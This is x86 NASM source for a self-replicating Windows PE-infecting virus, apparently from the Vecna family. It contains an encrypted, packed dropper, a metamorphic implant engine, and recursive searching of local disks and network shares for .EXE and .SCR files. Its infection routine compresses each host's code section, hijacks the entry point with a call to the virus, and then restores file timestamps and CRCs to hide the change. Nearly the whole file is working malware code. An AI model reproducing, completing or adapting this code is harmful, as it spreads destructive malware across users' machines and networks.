BITS 32

%include "pe.inc"

;%define DEBUG 1

copyright db "Vecna is a punk rocker now...",13,10
times 32-($-copyright) db 0

entry:
       pushad                           ;import APIs
       call delta
       mov esi, [esp+4+8*4]
       lodsd
       lodsd
       mov [ebp+dropper], eax
       lodsd
       mov [ebp+unpackedsize2], eax
       lodsd
       mov [ebp+getmhnd], eax
       lodsd
       xchg eax, edi            ;EDI==GetProcAddress
       lea esi, [ebp+import_table]
  .next_dll:
       lodsd
       test eax, eax
       jz .all_import
       push esi
       stc
       sbb ebx, ebx
       lea esi, [eax+ebp]
       push esi
       mov eax, 12345678h
  getmhnd equ $-4
       call eax
       test eax, eax
       jnz .dll_in_mem
       push esi
       call [ebp+LoadLibraryA]
       test eax, eax
       jz .importerror
       mov ebx, eax
  .dll_in_mem:
       xchg eax, ebx                            ;ebx==module handle
       mov ecx, [esp]
       mov [ecx-4], eax                         ;-1==no unload dll
  .skip_dllname:
       lodsb
       test al, al
       jnz .skip_dllname
  .next_import:
       lodsd
       test eax, eax
       jz .dll_done
       add eax, ebp
       push eax
       push ebx
       call edi
       mov [esi-4], eax
       test eax, eax
       jz .importerror
       jmp short .next_import
  .dll_done:
       pop esi
       jmp short .next_dll
  .importerror:
       pop esi
       stc
       db 0b0h
  .all_import:
       clc
       jc near .error

       push dword 12345678h
  unpackedsize2 equ $-4
       push byte 40h
       call [ebp+GlobalAlloc]
       mov [ebp+packed_exe], eax
       xchg eax, edi
       mov ecx, [ebp+unpackedsize2]
       mov esi, 12345678h
  dropper equ $-4
       pushad
       call [ebp+GetTickCount]
       mov dword [ebp+decrypt_key],eax
       mov dword [ebp+decrypt_size],ecx
  .encrypt:
       xor byte [esi+ecx],al                 ;encrypt exe code to pack
       add al,ah
       loop .encrypt
       popad
       call z_encode                         ;pack exe
       mov eax, [edi]
       mov [ebp+droppersize], eax

       lea eax, [ebp+lde32buffer]
       push eax
       call disasm_init
       call _malloc_init

       lea eax, [ebp+implant]
       push eax
       push dword implant_size
       lea eax, [ebp+list]
       push eax
       lea eax, [ebp+_malloc]
       push eax
       lea eax, [ebp+_disasm]
       push eax
       call [ebp+GetTickCount]

       call mutate_implant

       call engine
       mov esi, eax                     ;esi==new implant size
       push esi
       push byte 40h
       call [ebp+GlobalAlloc]
       xchg eax, ecx
       xchg esi, ecx
       xchg edi, esi
       mov [ebp+morphed_body], edi
       mov [ebp+morphed_size], ecx
       rep movsb                        ;copy meta implant to final buffer

       call _malloc_done

       lea eax, [ebp+infect_pe]
       push eax
       call busca_recursiva
       lea eax, [ebp+net_dir]
       push eax
       push byte 0
       call NetSearch

  .error:
       call delta
       push dword [ebp+packed_exe]
       call [ebp+GlobalFree]
       push dword [ebp+morphed_body]
       call [ebp+GlobalFree]


       lea esi, [ebp+import_table]
  .next_unload:
       lodsd
       test eax, eax
       jz .all_unload
       inc eax
       jz .next_unload
       dec eax
       push eax
       call [ebp+FreeLibrary]
       jmp short .next_unload
  .all_unload:
       popad
       ret 4

delta:
       call .delta
  .delta:
       pop ebp
       sub ebp, .delta
       ret

net_dir:
       pushad
       call delta
       mov eax, [esp+8*4+4]
       push eax
       call [ebp+SetCurrentDirectoryA]
       test eax, eax
       jz .done
       lea eax, [ebp+infect_pe]
       push eax
       call busca_disco                         ;busca dentro dos diretorios
  .done:
       popad
       ret 4

_disasm:
       pushad
       call delta
       push esi
       lea eax, [ebp+lde32buffer]
       push eax
       call disasm_main
       add esp, 4*2
       mov [esp+7*4], eax
       popad
       ret

_malloc:
       pushad
       call delta
       mov eax, 12345678h
  _malloc_pool equ $-4
       mov [esp+7*4], eax
       add eax, [esp+8*4+4]
       mov [ebp+_malloc_pool], eax
       popad
       ret 4

_malloc_done:
       pushad
       call delta
       push dword 12345678h
  _malloc_pool2 equ $-4
       call [ebp+GlobalFree]
       popad
       ret

_malloc_init:
       pushad
       call delta
       push dword 1024*1024
       push byte 40h
       call [ebp+GlobalAlloc]
       mov [ebp+_malloc_pool], eax
       mov [ebp+_malloc_pool2], eax
       popad
       ret

handle1 equ 148h
STACK_BUFFER equ 150h

infect_pe:
       pushad
       add esp, -STACK_BUFFER
       mov esi, [esp+(8*4)+STACK_BUFFER+4]
  .seek0end:
       lodsb
       test al, al
       jnz .seek0end
       mov eax, dword [esi-5]
       and eax, 0dfdfdfffh
       cmp eax, ".SCR"
       je .ismine
       cmp eax, ".EXE"
       jne near .done
  .ismine:

       call delta
%ifdef DEBUG
       pushad
       sub esp, 100h
       push byte 4
       call .zkips1
       db "Infectar este arquivo?", 0
  .zkips1:
       push dword [esp+(8*4)+STACK_BUFFER+4+(8*4)+100h+2*4]
       push byte 0
       call [ebp+MessageBoxA]
       cmp eax, 7
       je .done123
       mov edi, esp
       mov esi, [edi+(8*4)+STACK_BUFFER+4+(8*4)+100h]
       push byte 1
       push edi
       push esi
  .zopy:
       lodsb
       stosb
       test al, al
       jnz .zopy
       mov dword [edi-1], ".bak"
       mov byte [edi+3], 0
       call [ebp+CopyFileA]
       test eax, eax
  .done123:
       lahf
       add esp, 100h
       sahf
       popad
       jz near .done
%endif

       push esp
       push dword [esp+(8*4)+STACK_BUFFER+8]
       call [ebp+FindFirstFileA]
       mov ecx, eax
       inc ecx
       jz near .done
       push eax
       call [ebp+FindClose]

       push dword 80h
       sub edi, edi
       mov esi, [esp]
       push dword [esp+(8*4)+STACK_BUFFER+8]
       call [ebp+SetFileAttributesA]
       test eax, eax
       jz near .done
       push edi
       push esi
       push byte 3
       push edi
       push edi
       push dword 0C0000000h
       push dword [esp+(8*4)+STACK_BUFFER+7*4]
       call [ebp+CreateFileA]
       mov [esp+handle1], eax
       inc eax
       jz .done0
       push edi
       push dword [esp+32+4]
       push edi
       push byte 4              ;PAGE_READWRITE
       push edi
       push dword [esp+handle1+5*4]
       call [ebp+CreateFileMappingA]
       test eax, eax
       jz .done1
       push eax
       mov ecx, dword [esp+4+32]
       mov [ebp+infect_image.mapsize], ecx
       push ecx
       push edi
       push edi
       push dword 0f001fh               ;FILE_MAP_WRITE
       push eax
       call [ebp+MapViewOfFile]
       test eax, eax
       jz .done2

       push eax
       call infect_image

       call delta
       call [ebp+UnmapViewOfFile]
  .done2:
       call [ebp+CloseHandle]
  .done1:
       lea eax, [esp+20]
       push eax
       sub eax, byte 8
       push eax
       sub eax, byte 8
       push eax
       push dword [esp+handle1+3*4]
       call [ebp+SetFileTime]            ;eax!=0
       push dword [esp+handle1]
       call [ebp+CloseHandle]
  .done0:
       push dword [esp+0]
       push dword [esp+(8*4)+STACK_BUFFER+8]
       call [ebp+SetFileAttributesA]
  .done:
       add esp, STACK_BUFFER
       popad
       ret 4

ii_map             equ 0
ii_entry           equ 4
ii_import          equ 8
ii_packed_hostcode equ 12
ii_packed_size     equ 16
ii_export          equ 20
ii_vars_sizeof     equ 24

infect_image:
       pushad
       sub esp, ii_vars_sizeof
       mov ebp, esp
       mov esi, [esp+(8*4)+ii_vars_sizeof+4]

       mov [ebp+ii_map], esi
       cmp word [esi], "MZ"
       jnz .jmp2error

       push ebp
       call delta

       sub eax, eax
       mov edx, esi
       mov ecx, [ebp+.mapsize]
       pushad
       call xcrc16                              ;calc crc16
       mov [ebp+.crc16], eax
       popad
       call xcrc32                              ;calc crc32
       mov [ebp+.crc32], eax

       xchg ebp, ebx                    ;ebx=delta
       pop ebp

       mov eax, dword [esi+3ch]
       cmp eax, [ebx+.mapsize]
       jnb .jmp2error
       add esi, eax
       cmp dword [esi+PE_HEADER.Signature], "PE"
       jne .jmp2error

       cmp word [esi+PE_HEADER.Machine], 14Ch
       jne .jmp2error
       cmp word [esi+PE_HEADER.Magic], 10Bh
       jne .jmp2error

       movzx eax, word [esi+PE_HEADER.Characteristics]
       not al
       test ax, 2002h
       jnz .jmp2error

       movzx eax, word [esi+PE_HEADER.NumberOfSections]
       cmp al, 8
       ja .jmp2error
       sub al, 3
       jb .jmp2error

       mov eax, [esi+PE_HEADER.AddressOfEntryPoint]
       mov [ebp+ii_entry], eax
       test eax, eax
       jnz .eip
  .jmp2error:
       jmp .error
  .eip:

       mov eax, [esi+PE_HEADER.DataDirectory+IMAGE_DIRECTORY_ENTRY_IMPORT*8+IMAGE_DATA_DIRECTORY.VirtualAddress]
       test eax, eax
       jnz .import_exist
       dec eax
  .import_exist:
       mov [ebp+ii_import], eax

       mov eax, [esi+PE_HEADER.DataDirectory+IMAGE_DIRECTORY_ENTRY_EXPORT*8+IMAGE_DATA_DIRECTORY.VirtualAddress]
       test eax, eax
       jnz .export_exist
       dec eax
  .export_exist:
       mov [ebp+ii_export], eax

       xchg ebx, edx
       mov ebx, [esi+PE_HEADER.ImageBase]
       mov edi, [esi+PE_HEADER_SIZE+SECTION_HEADER.SizeOfRawData]

       mov eax, [edx+list+7*4]
       add eax, [edx+morphed_body]
       mov ecx, [esi+PE_HEADER_SIZE+SECTION_HEADER.VirtualAddress]
       add ecx,ebx
       mov [eax+1], ecx

       mov eax, [edx+list+6*4]        ;patch host_codesize in implant
       add eax, [edx+morphed_body]
       mov [eax+1], edi

       mov eax, [edx+morphed_size]
       add eax, [edx+droppersize]
       shl eax, 1
       cmp edi, eax
       jb .jmp2error           ;code too small is suspicious

       xchg ebx, ebp           ;ebx=stack frame
       call delta              ;ebp=delta

       pushad
       lea eax,[edi*2]
       push eax
       push byte 40h
       call [ebp+GlobalAlloc]
       mov [ebx+ii_packed_hostcode], eax
       xchg eax, edi
       xchg eax, ecx
       mov esi, [esi+PE_HEADER_SIZE+SECTION_HEADER.PointerToRawData]
       add esi, [ebx+ii_map]
       call z_encode            ;pack host code
       mov eax, [edi]
       mov [ebx+ii_packed_size], eax
       popad

       mov eax, [ebx+ii_packed_size]    ;edi=original host .code RawSize
       mov ecx, [ebp+morphed_size]
       add ecx, [ebp+droppersize]
       add ecx, eax
       cmp ecx, edi
       jb .codesection_ok
  .jmp2jmp2error:
       jmp .jmp2error           ;code dont compressed well enought...
  .codesection_ok:

       mov ecx, [esi+PE_HEADER_SIZE+SECTION_HEADER.VirtualAddress]
       add ecx, [esi+PE_HEADER_SIZE+SECTION_HEADER.SizeOfRawData]
       cmp [ebx+ii_import], ecx
       jb .jmp2jmp2error               ;neither import/export is in .code
       cmp [ebx+ii_export], ecx
       jb .jmp2jmp2error

       mov ecx, [ebx+ii_entry]
       sub ecx, [esi+PE_HEADER_SIZE+SECTION_HEADER.VirtualAddress]
       cmp ecx, [esi+PE_HEADER_SIZE+SECTION_HEADER.SizeOfRawData]
       jae .jmp2jmp2error              ;entrypoint no point to .code

       cmp [esi+PE_HEADER_SIZE+SECTION_HEADER.VirtualSize], edi
       jae .virtual_ok
       mov [esi+PE_HEADER_SIZE+SECTION_HEADER.VirtualSize], edi
  .virtual_ok:

       bts word [esi+PE_HEADER.Characteristics], 0      ;kill relocs

       cmp ecx, eax                              ;eax=packed .code size
       jb .in_start
  .in_end:
       mov edi, [esi+PE_HEADER_SIZE+SECTION_HEADER.PointerToRawData]
       add edi, [ebx+ii_map]
       mov edx, edi                              ;edx=raw virus
       add ecx, edi
       add edi, [esi+PE_HEADER_SIZE+SECTION_HEADER.SizeOfRawData]
       sub edi, eax                              ;edi=raw packed code
       jmp short .set
  .in_start:
       mov edi, [esi+PE_HEADER_SIZE+SECTION_HEADER.PointerToRawData]
       add edi, [ebx+ii_map]                     ;edi=raw packed code
       lea edx, [edi+eax]                        ;edx=raw virus
       add ecx, edi                              ;ecx=raw patch point
  .set:

       pushad
       mov eax, edi
       sub eax, [esi+PE_HEADER_SIZE+SECTION_HEADER.PointerToRawData]
       add eax, [esi+PE_HEADER_SIZE+SECTION_HEADER.VirtualAddress]
       add eax, [esi+PE_HEADER.ImageBase]
       sub eax, [ebx+ii_map]
       mov ecx, [ebp+list+9*4]              ;patch base_packed_body
       add ecx, [ebp+morphed_body]
       mov [ecx+1], eax

       call delta
       mov ecx,[esi+PE_HEADER_SIZE+SECTION_HEADER.PointerToRawData]
       mov [ebp+tmp_raw],ecx
       mov ecx,[esi+PE_HEADER_SIZE+SECTION_HEADER.VirtualAddress]
       mov [ebp+tmp_rva],ecx

       popad

       push dword [esi+PE_HEADER.ImageBase]
       mov esi, [ebx+ii_packed_hostcode]
       xchg ecx, eax
       mov [ebp+.save_frame_ptr], ebx
       pop ebx                  ;ebx=ImageBase

       push esi
       rep movsb                        ;copy packed body
       mov edi, eax                     ;edi=patch point
       mov eax, [eax]
       mov ecx, [ebp+list+0dh*4]
       add ecx, [ebp+morphed_body]
       mov [ecx+1], eax                 ;save first dword at entrypoint
       mov eax, [edi+4]
       mov ecx, [ebp+list+0eh*4]
       add ecx, [ebp+morphed_body]
       mov [ecx+1], eax                 ;save second dword at entrypoint
       mov al, 0e8h
       stosb
       stosd
       push edx
       sub edx, edi
       lea esi, [edi-4]
       mov [esi], edx                 ;build CALL virus
       pop edi

       call [ebp+GlobalFree]

       mov eax, [ebp+list+0fh*4]
       add [esi], eax

       mov esi, 12345678
  morphed_body equ $-4
       mov ecx, [ebp+unpackedsize2]
       mov eax, [ebp+list+4*4]
       mov [esi+eax+1], ecx

       mov ecx, [ebp+droppersize]
       add ecx, [ebp+morphed_size]
       mov eax, [ebp+list+0*4]
       mov [esi+eax+1], ecx

       mov eax, [ebp+list+3*4]
       mov edx, [ebp+list+2*4]
       cmp byte [esi+edx], 05
       je .patch
       neg eax                  ;invert for SUB
  .patch:
       mov [esi+edx+1], eax                 ;fix jmp2high

       mov eax, edi
       mov ecx, [ebp+.save_frame_ptr]
       sub eax, [ecx+ii_map]
       add ebx, eax
       sub ebx, 12345687h
  tmp_raw equ $-4
       add ebx, 12345687h
  tmp_rva equ $-4
       mov ecx, [ebp+list+1*4]  ;base_virus
       mov [esi+ecx+1], ebx
       mov eax, [ebp+morphed_size]
       add eax, ebx
       mov ecx, [ebp+list+5*4]  ;base_packedhybris
       mov [esi+ecx+1], eax
       mov eax, [ebp+list+6*4]
       lea eax, [eax+1+ebx]
       mov edx, [ebp+list+8*4]
       mov [esi+edx+2], eax
       mov edx, [ebp+list+0bh*4]
       mov [esi+edx+2], eax                 ;fix ptr2 host_codesize
       mov eax, [ebp+list+7*4]
       lea eax, [eax+1+ebx]
       mov edx, [ebp+list+0ah*4]
       mov [esi+edx+2], eax
       mov edx, [ebp+list+0ch*4]
       mov [esi+edx+2], eax                 ;fix ptr2 base_host

       mov ecx, 12345678h
  morphed_size equ $-4
       rep movsb                        ;copy implant

       mov ecx, 12345678h
  droppersize equ $-4
       mov esi, 12345678h
  packed_exe equ $-4
       rep movsb                        ;copy virus

       mov edx, 12345678h
  .save_frame_ptr equ $-4
       mov edx, [edx+ii_map]
       mov esi, 12345678h
  .crc16 equ $-4
       mov edi, 12345678h
  .crc32 equ $-4
       mov ecx, 12345678h
  .mapsize equ $-4
       lea ebx, [ecx-6]
       call fuckcrc48                   ;recalculate old crc

  .error:
       add esp, ii_vars_sizeof
       popad
       ret

mutate_implant:
       pushad
       call dword [ebp+GetTickCount]
       mov edx,"MOND"
       xor edx, eax
       mov [ebp+resname1],edx
       mov [ebp+resname2],eax
       mov edx,".EXE"
       xor edx, eax
       mov [ebp+resname5],edx
       mov [ebp+resname6],eax

     mov ecx, eax
     lea eax, [ecx*4+0EDB88320h]
     and eax, 0f0f0f0fh
     and ecx, 0f0f0f0fh
     add eax,"AAAA"
     add ecx,"AAAA"
     mov [ebp+resname3],ecx
     mov [ebp+resname4],eax

       and edx,1024-2
       add [ebp+ss_mod1],edx
       add [ebp+ss_mod2],edx
       add [ebp+ss_mod3],edx
       add [ebp+ss_mod4],edx
       popad
       ret

%include "search.inc"

%include "localnet.inc"

%include "implant.inc"

engine:
incbin "engine\engine.bin"

%include "z_encode.inc"

%include "lde32bin.inc"

%include "fuckcrc.inc"

list:
dd addon_size-implant            ;mov edi    00
dd base_virus-implant            ;mov esi    01
dd jmp2high-implant              ;add eax    02   ptr2 high_entry
dd high_entry-implant            ;           03
dd unpackedsize-implant          ;mov eax    04
dd base_packedhybris-implant     ;push       05
dd host_codesize-implant         ;push       06
dd base_host-implant             ;push       07
dd internal1-implant             ;push[]     08   ptr2 host_codesize
dd base_packed_body-implant      ;mov edi    09
dd internal2-implant             ;push[]     0a   ptr2 base_host
dd internal3-implant             ;push[]     0b   ptr2 host_codesize
dd internal4-implant             ;push[]     0c   ptr2 base_host
dd dword1-implant                ;mov eax    0d
dd dword2-implant                ;mov eax    0e
dd implant-implant               ;entrypoint 0f
dd -1

import_table dd kernel32
%ifdef DEBUG
             dd user32
%endif
             dd mpr
             dd 0

kernel32    db "KERNEL32.DLL", 0
.api001     dd .apiname001
.api002     dd .apiname002
.api003     dd .apiname003
.api004     dd .apiname004
.api005     dd .apiname005
.api006     dd .apiname006
.api007     dd .apiname007
.api008     dd .apiname008
.api009     dd .apiname009
.api010     dd .apiname010
.api011     dd .apiname011
.api012     dd .apiname012
.api013     dd .apiname013
.api014     dd .apiname014
.api015     dd .apiname015
.api016     dd .apiname016
.api017     dd .apiname017
.api018     dd .apiname018
.api019     dd .apiname019
.api020     dd .apiname020
.api021     dd .apiname021
            dd 0
.apiname001 db "LoadLibraryA", 0
.apiname002 db "FreeLibrary", 0
.apiname003 db "CreateFileA", 0
.apiname004 db "CloseHandle", 0
.apiname005 db "GlobalAlloc", 0
.apiname006 db "GlobalFree", 0
.apiname007 db "GetTickCount", 0
.apiname008 db "CreateFileMappingA", 0
.apiname009 db "MapViewOfFile", 0
.apiname010 db "UnmapViewOfFile", 0
.apiname011 db "GetSystemDirectoryA", 0
.apiname012 db "WriteFile", 0
.apiname013 db "FlushFileBuffers", 0
.apiname014 db "FindFirstFileA", 0
.apiname015 db "FindClose", 0
.apiname016 db "SetFileAttributesA", 0
.apiname017 db "SetFileTime", 0
.apiname018 db "CopyFileA", 0
.apiname019 db "GetDriveTypeA", 0
.apiname020 db "SetCurrentDirectoryA", 0
.apiname021 db "FindNextFileA", 0


LoadLibraryA       equ kernel32.api001
FreeLibrary        equ kernel32.api002
CreateFileA        equ kernel32.api003
CloseHandle        equ kernel32.api004
GlobalAlloc        equ kernel32.api005
GlobalFree         equ kernel32.api006
GetTickCount       equ kernel32.api007
CreateFileMappingA equ kernel32.api008
MapViewOfFile      equ kernel32.api009
UnmapViewOfFile    equ kernel32.api010
GetSystemDirectoryA equ kernel32.api011
WriteFile          equ kernel32.api012
FlushFileBuffers   equ kernel32.api013
FindFirstFileA     equ kernel32.api014
FindClose          equ kernel32.api015
SetFileAttributesA equ kernel32.api016
SetFileTime        equ kernel32.api017
CopyFileA          equ kernel32.api018
GetDriveTypeA      equ kernel32.api019
SetCurrentDirectoryA equ kernel32.api020
FindNextFileA      equ kernel32.api021


%ifdef DEBUG
user32      db "USER32.DLL", 0
.api001     dd .apiname001
            dd 0
.apiname001 db "MessageBoxA", 0
MessageBoxA equ user32.api001
%endif


mpr         db "MPR.DLL",0
.api001     dd .apiname001
.api002     dd .apiname002
.api003     dd .apiname003
            dd 0
.apiname001 db "WNetOpenEnumA", 0
.apiname002 db "WNetEnumResourceA", 0
.apiname003 db "WNetCloseEnum", 0

WNetOpenEnumA     equ mpr.api001
WNetEnumResourceA equ mpr.api002
WNetCloseEnum     equ mpr.api003


lde32buffer times 2048 db 0

buffer:
